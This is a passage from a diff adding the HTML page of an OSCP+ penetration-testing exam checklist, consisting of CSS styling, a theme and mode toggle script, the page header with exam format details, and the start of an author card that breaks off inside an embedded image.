@@ -1,0 +1,2878 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP+ Complete Exam Checklist & Attack Chains 2025-26</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:        #090b0f;
+    --bg2:       #0d1017;
+    --bg3:       #111520;
+    --panel:     #131824;
+    --border:    #1e2535;
+    --accent:    #00ff88;
+    --accent2:   #00b8ff;
+    --accent3:   #ff4c6a;
+    --accent4:   #ffb800;
+    --text:      #c8d3e8;
+    --text-dim:  #5c6880;
+    --text-mid:  #8896b3;
+    --code-bg:   #0b0e16;
+    --code-border:#1a2235;
+    --glow:      0 0 20px rgba(0,255,136,0.15);
+    --glow2:     0 0 20px rgba(0,184,255,0.15);
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background-color: var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13.5px;
+    line-height: 1.75;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ─── Noise + grid background ─── */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,255,136,0.02) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,136,0.02) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(0,184,255,0.05) 0%, transparent 70%),
+                radial-gradient(ellipse 60% 40% at 80% 100%, rgba(0,255,136,0.04) 0%, transparent 60%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* ─── Layout ─── */
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 24px 80px;
+  }
+
+  /* ─── Header ─── */
+  header {
+    padding: 60px 0 40px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 48px;
+    position: relative;
+  }
+
+  .header-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(0,255,136,0.08);
+    border: 1px solid rgba(0,255,136,0.25);
+    color: var(--accent);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    padding: 5px 14px;
+    border-radius: 3px;
+    margin-bottom: 22px;
+  }
+
+  .header-badge::before { content: '●'; animation: blink 1.5s infinite; }
+
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+
+  h1 {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: clamp(26px, 4vw, 44px);
+    line-height: 1.1;
+    letter-spacing: -1px;
+    color: #fff;
+    margin-bottom: 16px;
+  }
+
+  h1 span { color: var(--accent); }
+
+  .meta-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+    margin-top: 20px;
+  }
+
+  .meta-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    font-size: 11.5px;
+    padding: 5px 12px;
+    border-radius: 4px;
+  }
+
+  .meta-pill .val { color: var(--accent4); font-weight: 700; }
+  .meta-pill.red .val { color: var(--accent3); }
+  .meta-pill.blue .val { color: var(--accent2); }
+
+  /* ─── Warning banner ─── */
+  .warning-banner {
+    background: rgba(255,76,106,0.08);
+    border: 1px solid rgba(255,76,106,0.35);
+    border-left: 3px solid var(--accent3);
+    border-radius: 4px;
+    padding: 14px 18px;
+    color: #f08090;
+    font-size: 12.5px;
+    margin-bottom: 40px;
+  }
+
+  .warning-banner strong { color: var(--accent3); }
+
+  /* ─── TOC ─── */
+  .toc {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-top: 2px solid var(--accent2);
+    border-radius: 6px;
+    padding: 28px 32px;
+    margin-bottom: 56px;
+  }
+
+  .toc-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--accent2);
+    margin-bottom: 18px;
+  }
+
+  .toc ol {
+    list-style: none;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+    gap: 4px 32px;
+    counter-reset: toc;
+  }
+
+  .toc li { counter-increment: toc; }
+
+  .toc a {
+    text-decoration: none;
+    color: var(--text-mid);
+    font-size: 12.5px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 4px 0;
+    transition: color 0.2s;
+  }
+
+  .toc a::before {
+    content: counter(toc, decimal-leading-zero);
+    color: var(--text-dim);
+    font-size: 10px;
+    min-width: 22px;
+  }
+
+  .toc a:hover { color: var(--accent); }
+
+  /* ─── Sections ─── */
+  .section {
+    margin-bottom: 64px;
+    scroll-margin-top: 20px;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 28px;
+    padding-bottom: 14px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-num {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 4px 10px;
+    border-radius: 3px;
+    white-space: nowrap;
+  }
+
+  h2 {
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 20px;
+    color: #fff;
+    letter-spacing: -0.3px;
+  }
+
+  h3 {
+    font-family: 'Syne', sans-serif;
+    font-weight: 600;
+    font-size: 14px;
+    color: var(--accent2);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    margin: 28px 0 12px;
+  }
+
+  h4 {
+    font-family: 'Syne', sans-serif;
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--accent4);
+    margin: 20px 0 8px;
+  }
+
+  p { color: var(--text-mid); font-size: 13px; margin-bottom: 10px; }
+
+  /* ─── Code blocks ─── */
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-radius: 6px;
+    padding: 20px 22px;
+    overflow-x: auto;
+    margin: 12px 0 20px;
+    position: relative;
+    font-size: 12.5px;
+    line-height: 1.8;
+  }
+
+  pre::before {
+    content: attr(data-lang);
+    position: absolute;
+    top: 8px;
+    right: 12px;
+    font-size: 10px;
+    letter-spacing: 1.5px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+  }
+
+  code { font-family: 'JetBrains Mono', monospace; color: #e0eaff; }
+
+  pre code {
+    color: #c8d3e8;
+  }
+
+  /* syntax-ish coloring */
+  pre .c  { color: #4a5568; }   /* comments */
+  pre .kw { color: var(--accent2); font-weight: 500; }
+  pre .str{ color: var(--accent); }
+  pre .cm { color: var(--accent4); }
+  pre .op { color: var(--accent3); }
+
+  /* Inline code */
+  p code, li code {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 1px 6px;
+    font-size: 12px;
+    color: var(--accent);
+  }
+
+  /* ─── Tables ─── */
+  .table-wrap { overflow-x: auto; margin: 12px 0 20px; border-radius: 6px; border: 1px solid var(--border); }
+
+  table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+
+  thead tr { background: var(--bg3); }
+  thead th {
+    padding: 12px 16px;
+    text-align: left;
+    color: var(--accent2);
+    font-weight: 600;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    font-size: 11px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  tbody tr { border-bottom: 1px solid rgba(30,37,53,0.7); transition: background 0.15s; }
+  tbody tr:last-child { border-bottom: none; }
+  tbody tr:hover { background: rgba(0,255,136,0.03); }
+  td { padding: 10px 16px; color: var(--text); vertical-align: top; }
+  td:first-child { color: var(--accent4); font-weight: 500; white-space: nowrap; }
+  td .action { color: var(--accent2); }
+  td .impact { color: var(--accent3); }
+
+  /* ─── Point boxes ─── */
+  .points-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 12px;
+    margin: 12px 0 24px;
+  }
+
+  .point-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px 18px;
+  }
+
+  .point-card .label { font-size: 11px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }
+  .point-card .pts { font-family: 'Syne', sans-serif; font-size: 26px; font-weight: 800; color: var(--accent); line-height: 1.1; }
+  .point-card .pts.blue { color: var(--accent2); }
+  .point-card .pts.yellow { color: var(--accent4); }
+  .point-card .sublabel { font-size: 11px; color: var(--text-mid); margin-top: 2px; }
+
+  /* ─── Info callout ─── */
+  .callout {
+    background: rgba(0,184,255,0.06);
+    border: 1px solid rgba(0,184,255,0.22);
+    border-left: 3px solid var(--accent2);
+    border-radius: 4px;
+    padding: 14px 18px;
+    margin: 16px 0;
+    font-size: 12.5px;
+    color: #90b8e0;
+  }
+
+  .callout.green {
+    background: rgba(0,255,136,0.05);
+    border-color: rgba(0,255,136,0.2);
+    border-left-color: var(--accent);
+    color: #80d8a8;
+  }
+
+  .callout.red {
+    background: rgba(255,76,106,0.06);
+    border-color: rgba(255,76,106,0.22);
+    border-left-color: var(--accent3);
+    color: #f09090;
+  }
+
+  /* ─── Student learning callout (the "why" behind commands) ─── */
+  .callout.learn {
+    background: rgba(169,120,255,0.06);
+    border-color: rgba(169,120,255,0.22);
+    border-left-color: #a978ff;
+    color: #c4abf0;
+  }
+  .callout.learn strong { color: #fff; }
+
+  .learn-tag {
+    display: inline-block;
+    background: rgba(169,120,255,0.14);
+    border: 1px solid rgba(169,120,255,0.35);
+    color: #c9b0ff;
+    font-size: 9.5px;
+    font-weight: 700;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    padding: 2px 8px;
+    border-radius: 3px;
+    margin-bottom: 8px;
+    margin-right: 6px;
+  }
+
+  .callout p { margin: 8px 0 0; }
+  .callout p:first-child { margin-top: 0; }
+
+  kbd {
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-bottom-width: 2px;
+    border-radius: 3px;
+    padding: 1px 5px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.9em;
+    color: var(--accent2);
+  }
+
+  .callout strong { color: #fff; }
+
+  /* ─── Checklist ─── */
+  .checklist { list-style: none; }
+  .checklist li {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 5px 0;
+    color: var(--text-mid);
+    font-size: 12.5px;
+    border-bottom: 1px solid rgba(30,37,53,0.4);
+  }
+
+  .checklist li::before {
+    content: '☐';
+    color: var(--text-dim);
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+
+  .checklist li.done::before { content: '☑'; color: var(--accent); }
+
+  /* ─── Decision tree box ─── */
+  .tree-box {
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-radius: 6px;
+    padding: 20px 24px;
+    font-size: 12px;
+    line-height: 1.9;
+    color: #8fa8c8;
+    white-space: pre;
+    overflow-x: auto;
+    margin: 12px 0 20px;
+  }
+
+  .tree-box .root { color: var(--accent); font-weight: 700; }
+  .tree-box .leaf { color: var(--accent2); }
+  .tree-box .win  { color: var(--accent); font-weight: 600; }
+  .tree-box .note { color: var(--text-dim); }
+
+  /* ─── Scenario blocks ─── */
+  .scenario-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 10px;
+    margin: 12px 0 20px;
+  }
+
+  .scenario {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 14px 16px;
+    font-size: 12px;
+  }
+
+  .scenario .sc-label { color: var(--accent4); font-weight: 700; font-size: 11px; letter-spacing: 1px; margin-bottom: 4px; }
+  .scenario .sc-pts { font-family: 'Syne', sans-serif; font-size: 20px; font-weight: 800; color: var(--accent); }
+  .scenario .sc-desc { color: var(--text-mid); font-size: 11.5px; margin-top: 4px; }
+
+  /* ─── Back to top ─── */
+  .back-top {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 11px;
+    color: var(--text-dim);
+    text-decoration: none;
+    border: 1px solid var(--border);
+    padding: 5px 12px;
+    border-radius: 3px;
+    margin-top: 20px;
+    transition: color 0.2s, border-color 0.2s;
+  }
+
+  .back-top:hover { color: var(--accent); border-color: var(--accent); }
+
+  /* ─── Divider ─── */
+  hr { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+
+  /* ─── Footer ─── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 32px 0 0;
+    margin-top: 60px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 12px;
+    font-size: 11.5px;
+    color: var(--text-dim);
+  }
+
+  footer span { color: var(--accent); }
+
+  /* ─── Author card ─── */
+  .author-card {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    flex-wrap: wrap;
+    margin-top: 56px;
+    padding: 24px 26px;
+    background: linear-gradient(135deg, rgba(0,255,136,0.04), rgba(0,184,255,0.04));
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    position: relative;
+    overflow: hidden;
+  }
+  .author-card::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(circle at 0% 0%, rgba(0,255,136,0.07), transparent 45%);
+    pointer-events: none;
+  }
+  .author-avatar {
+    width: 88px;
+    height: 88px;
+    border-radius: 50%;
+    object-fit: cover;
+    border: 2px solid var(--accent);
+    box-shadow: 0 0 22px rgba(0,255,136,0.25);
+    flex-shrink: 0;
+  }
+  .author-info { position: relative; z-index: 1; min-width: 200px; flex: 1; }
+  .author-label {
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 4px;
+  }
+  .author-name {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 22px;
+    color: #fff;
+    line-height: 1.1;
+    margin-bottom: 3px;
+  }
+  .author-role { font-size: 12px; color: var(--text-mid); margin-bottom: 14px; }
+  .author-links { display: flex; gap: 10px; flex-wrap: wrap; }
+  .author-links a {
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    text-decoration: none;
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--text);
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    padding: 7px 14px;
+    border-radius: 6px;
+    transition: all 0.18s ease;
+  }
+  .author-links a:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+    box-shadow: var(--glow);
+    transform: translateY(-1px);
+  }
+  .author-links a.li:hover { border-color: var(--accent2); color: var(--accent2); box-shadow: var(--glow2); }
+  .author-links a svg { width: 15px; height: 15px; fill: currentColor; }
+
+  [data-theme="light"] .author-card { background: linear-gradient(135deg, rgba(0,150,90,0.05), rgba(0,120,200,0.05)); }
+  [data-theme="light"] .author-name { color: #0e1525; }
+
+  .author-card--top { margin-top: 0; margin-bottom: 28px; }
+
+  @media (max-width: 560px) {
+    .author-card { gap: 16px; padding: 20px; }
+    .author-avatar { width: 70px; height: 70px; }
+    .author-name { font-size: 19px; }
+  }
+
+  /* ─── Scrollbar ─── */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--accent2); }
+
+  /* ─── Selection ─── */
+  ::selection { background: rgba(0,255,136,0.2); color: #fff; }
+
+  /* ══════════════════════════════════════════
+     LIGHT MODE
+  ══════════════════════════════════════════ */
+  [data-theme="light"] {
+    --bg:         #f2f4f8;
+    --bg2:        #eaecf2;
+    --bg3:        #e2e5ed;
+    --panel:      #ffffff;
+    --border:     #cdd2df;
+    --accent:     #009955;
+    --accent2:    #0077cc;
+    --accent3:    #d63050;
+    --accent4:    #c47f00;
+    --text:       #1c2333;
+    --text-dim:   #8a96aa;
+    --text-mid:   #4a5570;
+    --code-bg:    #edf0f7;
+    --code-border:#d0d5e4;
+    --glow:       0 0 20px rgba(0,153,85,0.10);
+    --glow2:      0 0 20px rgba(0,119,204,0.10);
+  }
+
+  [data-theme="light"] body::before {
+    background-image:
+      linear-gradient(rgba(0,100,60,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,100,60,0.04) 1px, transparent 1px);
+  }
+
+  [data-theme="light"] body::after {
+    background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(0,119,204,0.06) 0%, transparent 70%),
+                radial-gradient(ellipse 60% 40% at 80% 100%, rgba(0,153,85,0.05) 0%, transparent 60%);
+  }
+
+  [data-theme="light"] h1 { color: #0e1525; }
+  [data-theme="light"] h2 { color: #0e1525; }
+  [data-theme="light"] pre code { color: #2a3450; }
+  [data-theme="light"] code { color: #1e6090; }
+  [data-theme="light"] p code, [data-theme="light"] li code { color: var(--accent2); }
+  [data-theme="light"] .callout { color: #2d5a7a; }
+  [data-theme="light"] .callout strong { color: #0e1525; }
+  [data-theme="light"] .callout.green { color: #1a5e38; }
+  [data-theme="light"] .callout.red { color: #7a1e2e; }
+  [data-theme="light"] .callout.learn { color: #4a2d7a; }
+  [data-theme="light"] .learn-tag { color: #5a3d9a; }
+  [data-theme="light"] .warning-banner { color: #7a2030; background: rgba(214,48,80,0.07); }
+  [data-theme="light"] .tree-box { color: #3a4d6a; }
+  [data-theme="light"] tbody tr:hover { background: rgba(0,119,204,0.04); }
+  [data-theme="light"] td { color: var(--text); }
+  [data-theme="light"] ::selection { background: rgba(0,119,204,0.18); color: #0e1525; }
+  [data-theme="light"] .header-badge { background: rgba(0,153,85,0.10); border-color: rgba(0,153,85,0.30); }
+  [data-theme="light"] .checklist li { color: var(--text-mid); }
+  [data-theme="light"] footer { color: var(--text-dim); }
+  [data-theme="light"] .meta-pill { color: var(--text-mid); }
+
+  /* ══════════════════════════════════════════
+     THEME TOGGLE BUTTON
+  ══════════════════════════════════════════ */
+  #theme-toggle {
+    position: fixed;
+    top: 14px;
+    right: 14px;
+    z-index: 9999;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 50%;
+    width: 42px;
+    height: 42px;
+    cursor: pointer;
+    font-size: 19px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background 0.2s, border-color 0.2s, transform 0.15s;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.25);
+    padding: 0;
+    line-height: 1;
+  }
+
+  #theme-toggle:hover {
+    border-color: var(--accent2);
+    transform: scale(1.08);
+  }
+
+  /* ══════════════════════════════════════════
+     BEGINNER / EXAM MODE TOGGLE
+  ══════════════════════════════════════════ */
+  #mode-toggle {
+    position: fixed;
+    top: 14px;
+    right: 66px;
+    z-index: 9999;
+    height: 42px;
+    padding: 0 16px;
+    background: var(--panel);
+    border: 1px solid var(--accent);
+    border-radius: 21px;
+    cursor: pointer;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--accent);
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    transition: all 0.18s ease;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.25);
+    line-height: 1;
+  }
+  #mode-toggle:hover { box-shadow: var(--glow); transform: translateY(-1px); }
+  html[data-mode="exam"] #mode-toggle { border-color: var(--accent4); color: var(--accent4); }
+
+  /* Hide all beginner-only learning content in Exam Mode */
+  html[data-mode="exam"] .beginner-only,
+  html[data-mode="exam"] .callout.learn { display: none !important; }
+
+  /* The little mode hint under the header */
+  .mode-hint {
+    font-size: 11.5px;
+    color: var(--text-dim);
+    margin: 14px 0 0;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+  .mode-hint b { color: var(--accent); font-weight: 600; }
+  html[data-mode="exam"] .mode-hint b { color: var(--accent4); }
+
+  /* ══════════════════════════════════════════
+     CONCEPTS 101 — cards, analogies, diagrams
+  ══════════════════════════════════════════ */
+  .concept-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px 22px;
+    margin: 18px 0;
+  }
+  .concept-card > h4 {
+    font-family: 'Syne', sans-serif;
+    font-size: 16px;
+    font-weight: 700;
+    color: #fff;
+    margin: 0 0 4px;
+    display: flex;
+    align-items: center;
+    gap: 9px;
+  }
+  .concept-card .ico {
+    width: 30px; height: 30px;
+    flex-shrink: 0;
+    display: inline-flex; align-items: center; justify-content: center;
+    background: rgba(0,255,136,0.08);
+    border: 1px solid rgba(0,255,136,0.25);
+    border-radius: 7px;
+    font-size: 15px;
+  }
+  .concept-card p { color: var(--text-mid); margin: 10px 0 0; }
+  [data-theme="light"] .concept-card > h4 { color: #0e1525; }
+
+  /* Analogy callout — amber/teal "think of it like…" */
+  .analogy {
+    background: rgba(255,184,0,0.05);
+    border: 1px solid rgba(255,184,0,0.2);
+    border-left: 3px solid var(--accent4);
+    border-radius: 7px;
+    padding: 12px 15px;
+    margin: 14px 0 0;
+    font-size: 13px;
+    color: #d6c08a;
+  }
+  .analogy b { color: var(--accent4); }
+  [data-theme="light"] .analogy { color: #7a5e1e; }
+
+  /* Diagram wrapper */
+  .diagram {
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-radius: 9px;
+    padding: 18px 16px 12px;
+    margin: 16px 0 0;
+    text-align: center;
+  }
+  .diagram svg { width: 100%; height: auto; max-width: 640px; display: block; margin: 0 auto; }
+  .diagram .cap {
+    font-size: 11px;
+    color: var(--text-dim);
+    margin-top: 10px;
+    letter-spacing: 0.3px;
+  }
+  .dlabel { font-family: 'JetBrains Mono', monospace; font-size: 12px; fill: var(--text); }
+  .dlabel-sm { font-family: 'JetBrains Mono', monospace; font-size: 10px; fill: var(--text-mid); }
+  .dlabel-bold { font-family: 'Syne', sans-serif; font-weight: 700; font-size: 13px; fill: #fff; }
+  [data-theme="light"] .dlabel-bold { fill: #0e1525; }
+
+  /* ══════════════════════════════════════════
+     MOBILE — RESPONSIVE
+  ══════════════════════════════════════════ */
+  @media (max-width: 768px) {
+    #mode-toggle { right: 56px; top: 10px; height: 38px; padding: 0 11px; font-size: 11px; }
+    #mode-toggle .mt-label { display: none; }
+    .concept-card { padding: 16px 16px; }
+
+    body { font-size: 13px; }
+
+    .wrapper { padding: 0 14px 60px; }
+
+    header { padding: 36px 0 22px; padding-right: 52px; margin-bottom: 28px; }
+
+    h1 { font-size: clamp(22px, 6vw, 32px); letter-spacing: -0.5px; }
+    h2 { font-size: 17px; }
+    h3 { font-size: 12.5px; margin: 20px 0 10px; }
+
+    .meta-row { gap: 7px; margin-top: 14px; }
+    .meta-pill { font-size: 10.5px; padding: 4px 9px; }
+
+    .toc { padding: 18px 16px; margin-bottom: 36px; }
+    .toc ol { grid-template-columns: 1fr; gap: 2px; }
+    .toc a { font-size: 12px; }
+
+    .section { margin-bottom: 44px; }
+    .section-header { gap: 10px; margin-bottom: 20px; }
+
+    pre {
+      font-size: 11.5px;
+      padding: 14px 14px;
+      border-radius: 5px;
+      /* show horizontal scroll hint */
+      -webkit-overflow-scrolling: touch;
+    }
+
+    pre::after {
+      content: '→';
+      position: absolute;
+      top: 50%;
+      right: 8px;
+      transform: translateY(-50%);
+      font-size: 11px;
+      color: var(--text-dim);
+      opacity: 0.5;
+      pointer-events: none;
+    }
+
+    .table-wrap { border-radius: 4px; }
+    table { font-size: 12px; }
+    thead th { padding: 9px 12px; font-size: 10px; }
+    td { padding: 8px 12px; }
+    td:first-child { white-space: normal; }
+
+    .points-grid { grid-template-columns: repeat(2, 1fr); gap: 8px; }
+    .point-card { padding: 12px 14px; }
+    .point-card .pts { font-size: 22px; }
+
+    .scenario-grid { grid-template-columns: 1fr; gap: 8px; }
+
+    .callout { padding: 12px 14px; font-size: 12px; }
+    .warning-banner { padding: 12px 14px; font-size: 12px; margin-bottom: 28px; }
+
+    .checklist li { font-size: 12px; }
+
+    .tree-box { font-size: 11px; padding: 14px 14px; }
+
+    footer { flex-direction: column; align-items: flex-start; gap: 6px; font-size: 11px; padding: 24px 0 0; }
+
+    #theme-toggle { top: 10px; right: 10px; width: 38px; height: 38px; font-size: 17px; }
+  }
+
+  @media (max-width: 420px) {
+    .points-grid { grid-template-columns: 1fr; }
+    pre { font-size: 11px; }
+    .toc a::before { display: none; }
+  }
+</style>
+<script>
+  // Apply saved theme + mode before render to prevent flash
+  (function(){
+    try {
+      var h = document.documentElement;
+      if (localStorage.getItem('oscp-theme') === 'light') h.setAttribute('data-theme','light');
+      h.setAttribute('data-mode', localStorage.getItem('oscp-mode') === 'exam' ? 'exam' : 'beginner');
+    } catch(e){}
+  })();
+</script>
+</head>
+<body>
+<button id="mode-toggle" onclick="toggleMode()" title="Switch between Beginner and Exam mode">🎓 <span class="mt-label">Beginner</span></button>
+<button id="theme-toggle" onclick="toggleTheme()" title="Toggle light/dark mode">🌙</button>
+<div class="wrapper">
+
+<!-- ═══════════════════ HEADER ═══════════════════ -->
+<header id="top">
+  <div class="header-badge">LIVE</div>
+  <h1>OSCP<span>+</span> Complete Exam Checklist<br>&amp; Attack Chains</h1>
+  <div class="meta-row">
+    <div class="meta-pill">Edition <span class="val">PEN-200 v2025-26</span></div>
+    <div class="meta-pill">Format <span class="val">3 Standalone + 1 AD Set</span></div>
+    <div class="meta-pill red">Pass Score <span class="val">70 / 100 pts</span></div>
+    <div class="meta-pill blue">AD Set <span class="val">ASSUMED BREACH</span></div>
+  </div>
+  <p class="mode-hint">▸ You're in <b id="mode-name">Beginner</b> mode — concept explanations &amp; diagrams are shown. Tap the <b>🎓 / ⚡</b> button (top-right) to switch to <b>Exam Mode</b> for commands-only.</p>
+</header>
+
+<!-- ═══════════════════ AUTHOR ═══════════════════ -->
+<div class="author-card author-card--top">
+  <img class="author-avatar" src="data:image/jpeg;base64,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